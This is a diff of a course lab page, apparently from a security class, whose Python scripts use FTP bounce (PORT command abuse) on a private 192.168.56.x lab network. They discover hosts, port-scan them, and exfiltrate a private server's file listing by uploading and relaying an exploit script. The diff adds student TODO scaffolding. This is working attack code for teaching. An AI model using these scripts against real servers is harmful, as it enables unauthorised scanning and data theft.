@@ -60,7 +60,6 @@
 <div class="section" id="task-2-discover-hosts-on-the-internal-network">
 <h3>6.2.1. Task 2: Discover hosts on the internal network<a class="headerlink" href="#task-2-discover-hosts-on-the-internal-network" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
-<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot;/..&quot;</span><span class="p">)</span>
 <span class="kn">from</span> <span class="nn">cp_ftp</span> <span class="k">import</span> <span class="n">FTP</span>
 
 <span class="c1"># List of discovered host IP addresses.</span>
@@ -71,9 +70,17 @@
   <span class="n">ftp</span> <span class="o">=</span> <span class="n">FTP</span><span class="p">(</span><span class="s2">&quot;192.168.56.101&quot;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
   <span class="n">ftp</span><span class="o">.</span><span class="n">send_login_commands</span><span class="p">(</span><span class="s2">&quot;student&quot;</span><span class="p">,</span> <span class="s2">&quot;golyeeHug6&quot;</span><span class="p">)</span>
 
-  <span class="c1"># Send a PORT command pointing to port 22 on this target.</span>
   <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;192.168.56.</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">last_octet</span>
   <span class="n">target_address</span> <span class="o">=</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">22</span><span class="p">)</span>
+
+  <span class="c1">################################################################################</span>
+  <span class="c1"># STUDENT TODO 1: Send a PORT command for target_address. Then send data to it.</span>
+  <span class="c1"># Hint: the provided examples/remote_port.py will be useful.</span>
+  <span class="c1"># Important: if a port is open then run:</span>
+  <span class="c1">#   hosts_ports[host].append(port)</span>
+  <span class="c1">################################################################################</span>
+
+  <span class="c1"># Send a PORT command pointing to port 22 on this target.</span>
   <span class="n">ftp</span><span class="o">.</span><span class="n">send_port_command</span><span class="p">(</span><span class="n">target_address</span><span class="p">)</span>
   <span class="c1"># If the PORT command was somehow invalid, skip this target.</span>
   <span class="n">response</span> <span class="o">=</span> <span class="n">ftp</span><span class="o">.</span><span class="n">recv_response</span><span class="p">()</span>
@@ -100,52 +107,65 @@
 <div class="section" id="task-3-port-scan-discovered-hosts">
 <h3>6.2.2. Task 3: Port scan discovered hosts<a class="headerlink" href="#task-3-port-scan-discovered-hosts" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
-<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot;/..&quot;</span><span class="p">)</span>
 <span class="kn">from</span> <span class="nn">cp_ftp</span> <span class="k">import</span> <span class="n">FTP</span>
 
 <span class="c1"># List of discovered host IP addresses.</span>
-<span class="n">hosts</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">hosts</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;192.168.56.102&quot;</span><span class="p">,</span> <span class="s2">&quot;192.168.56.103&quot;</span><span class="p">]</span>
+<span class="n">hosts_ports</span> <span class="o">=</span> <span class="p">{}</span>
 
-<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65536</span><span class="p">):</span>
-  <span class="c1"># Make a new FTP connection each time for simplicity.</span>
-  <span class="n">ftp</span> <span class="o">=</span> <span class="n">FTP</span><span class="p">(</span><span class="s2">&quot;192.168.56.101&quot;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
-  <span class="n">ftp</span><span class="o">.</span><span class="n">send_login_commands</span><span class="p">(</span><span class="s2">&quot;student&quot;</span><span class="p">,</span> <span class="s2">&quot;golyeeHug6&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">host</span> <span class="ow">in</span> <span class="n">hosts</span><span class="p">:</span>
+  <span class="n">hosts_ports</span><span class="p">[</span><span class="n">host</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>
 
-  <span class="c1"># Send a PORT command pointing to target port on target host.</span>
-  <span class="n">target_address</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;192.168.56.101&quot;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-  <span class="n">ftp</span><span class="o">.</span><span class="n">send_port_command</span><span class="p">(</span><span class="n">target_address</span><span class="p">)</span>
-  <span class="c1"># If the PORT command was somehow invalid, skip this host.</span>
-  <span class="n">response</span> <span class="o">=</span> <span class="n">ftp</span><span class="o">.</span><span class="n">recv_response</span><span class="p">()</span>
-  <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
-    <span class="k">continue</span>
+  <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1024</span><span class="p">):</span>
+    <span class="c1"># Make a new FTP connection each time for simplicity.</span>
+    <span class="n">ftp</span> <span class="o">=</span> <span class="n">FTP</span><span class="p">(</span><span class="s2">&quot;192.168.56.101&quot;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">ftp</span><span class="o">.</span><span class="n">send_login_commands</span><span class="p">(</span><span class="s2">&quot;student&quot;</span><span class="p">,</span> <span class="s2">&quot;golyeeHug6&quot;</span><span class="p">)</span>
 
-  <span class="c1"># Try sending file LIST output to target on chosen port.</span>
-  <span class="n">ftp</span><span class="o">.</span><span class="n">send_command</span><span class="p">(</span><span class="s2">&quot;LIST&quot;</span><span class="p">)</span>
-  <span class="n">response</span> <span class="o">=</span> <span class="n">ftp</span><span class="o">.</span><span class="n">recv_response</span><span class="p">()</span>
-  <span class="nb">print</span><span class="p">(</span><span class="n">target_address</span><span class="p">,</span> <span class="n">response</span><span class="p">)</span>
+    <span class="n">target_address</span> <span class="o">=</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
 
-  <span class="c1"># Success is indicated by this response:</span>
-  <span class="c1">#   150 Opening ASCII mode data connection for file list</span>
-  <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">code</span> <span class="o">==</span> <span class="mi">150</span><span class="p">:</span>
-    <span class="n">hosts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">target_address</span><span class="p">)</span>
+    <span class="c1">################################################################################</span>
+    <span class="c1"># STUDENT TODO 1: Send a PORT command for target_address. Then send data to it.</span>
+    <span class="c1"># Hint: the provided examples/remote_port.py will be useful.</span>
+    <span class="c1"># Important: if a port is open then run:</span>
+    <span class="c1">#   hosts_ports[host].append(port)</span>
+    <span class="c1">################################################################################</span>
 
-  <span class="n">ftp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="c1"># Send a PORT command pointing to target port on target host.</span>
+    <span class="n">ftp</span><span class="o">.</span><span class="n">send_port_command</span><span class="p">(</span><span class="n">target_address</span><span class="p">)</span>
+    <span class="c1"># If the PORT command was somehow invalid, skip this host.</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">ftp</span><span class="o">.</span><span class="n">recv_response</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+      <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+      <span class="k">continue</span>
 
-<span class="nb">print</span><span class="p">(</span><span class="n">hosts</span><span class="p">)</span>
+    <span class="c1"># Try sending file LIST output to target on chosen port.</span>
+    <span class="n">ftp</span><span class="o">.</span><span class="n">send_command</span><span class="p">(</span><span class="s2">&quot;LIST&quot;</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">ftp</span><span class="o">.</span><span class="n">recv_response</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">target_address</span><span class="p">,</span> <span class="n">response</span><span class="p">)</span>
+
+    <span class="c1"># Success is indicated by this response:</span>
+    <span class="c1">#   150 Opening ASCII mode data connection for file list</span>
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">code</span> <span class="o">==</span> <span class="mi">150</span><span class="p">:</span>
+      <span class="n">hosts_ports</span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
+
+    <span class="n">ftp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">host</span> <span class="ow">in</span> <span class="n">hosts</span><span class="p">:</span>
+  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2"> has ports </span><span class="si">%s</span><span class="s2"> open.&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="s2">&quot;, &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">hosts_ports</span><span class="p">[</span><span class="n">host</span><span class="p">]))))</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="extension-task-exfiltrate-data-from-a-private-ftp-server">
 <h3>6.2.3. Extension Task: Exfiltrate data from a private FTP server<a class="headerlink" href="#extension-task-exfiltrate-data-from-a-private-ftp-server" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
-<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot;/..&quot;</span><span class="p">)</span>
 <span class="kn">from</span> <span class="nn">cp_ftp</span> <span class="k">import</span> <span class="n">FTP</span>
 
 <span class="n">ftp</span> <span class="o">=</span> <span class="n">FTP</span><span class="p">(</span><span class="s2">&quot;192.168.56.101&quot;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 <span class="n">ftp</span><span class="o">.</span><span class="n">send_login_commands</span><span class="p">(</span><span class="s2">&quot;student&quot;</span><span class="p">,</span> <span class="s2">&quot;golyeeHug6&quot;</span><span class="p">)</span>
 
+<span class="c1">################################################################################</span>
 <span class="c1"># Build a script to get a LIST of files on the private server.</span>
+<span class="c1">################################################################################</span>
 
 <span class="c1"># 1. Commands to log in.</span>
 <span class="n">login_commands</span> <span class="o">=</span> <span class="n">ftp</span><span class="o">.</span><span class="n">get_login_commands</span><span class="p">(</span><span class="s2">&quot;student&quot;</span><span class="p">,</span> <span class="s2">&quot;golyeeHug6&quot;</span><span class="p">)</span>
@@ -165,7 +185,10 @@
 <span class="n">exploit_file</span> <span class="o">=</span> <span class="s2">&quot;exploit.txt&quot;</span>
 <span class="n">file_contents</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">exploit_commands</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">1000000</span>
 
-<span class="c1"># Upload the script to the server.</span>
+<span class="c1">################################################################################</span>
+<span class="c1"># STUDENT TODO 1: Upload the script to the server.</span>
+<span class="c1"># Hint: the provided examples/stor.py will be useful.</span>
+<span class="c1">################################################################################</span>
 
 <span class="c1"># 1. Set the PORT to send data upon.</span>
 <span class="n">data_address</span> <span class="o">=</span> <span class="n">ftp</span><span class="o">.</span><span class="n">new_data_address</span><span class="p">()</span>
@@ -189,7 +212,15 @@
   <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
   <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="c1"># Have the server send the script to the private server.</span>
+<span class="c1">################################################################################</span>
+<span class="c1"># STUDENT TODO 2: Have the server send the script to the private server.</span>
+<span class="c1"># Hint: the provided examples/remote_port.py will be useful.</span>
+<span class="c1"># Hint: unlike in that example, we *are* recieving data inbetween the two data</span>
+<span class="c1">#       transfer status responses.</span>
+<span class="c1"># Hint: you need to get data from the same port as exfiltration_data_address.</span>
+<span class="c1">#       ftp.new_data_address(port=exfiltration_data_address[1])</span>
+<span class="c1">#       print(&quot;EXFILTRATED DATA: %s&quot; % ftp.recv_data())</span>
+<span class="c1">################################################################################</span>
 
 <span class="c1"># 1. Tell server it can open Data Connection to private server&#39;s FTP Command port.</span>
 <span class="n">target_address</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;192.168.56.103&quot;</span><span class="p">,</span> <span class="mi">21</span><span class="p">)</span>
@@ -207,7 +238,7 @@
   <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
 <span class="c1"># 3. Rebind to the exfilitration port chosen earlier and read LIST of private files from it.</span>
-<span class="n">ftp</span><span class="o">.</span><span class="n">new_data_address</span><span class="p">(</span><span class="n">exfiltration_data_address</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">ftp</span><span class="o">.</span><span class="n">new_data_address</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="n">exfiltration_data_address</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
 <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;********* [EXFILTRATED DATA BEGINS] *********&quot;</span><span class="p">)</span>
 <span class="n">ftp</span><span class="o">.</span><span class="n">recv_data</span><span class="p">()</span>
 <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;********* [EXFILTRATED DATA ENDS] *********&quot;</span><span class="p">)</span>
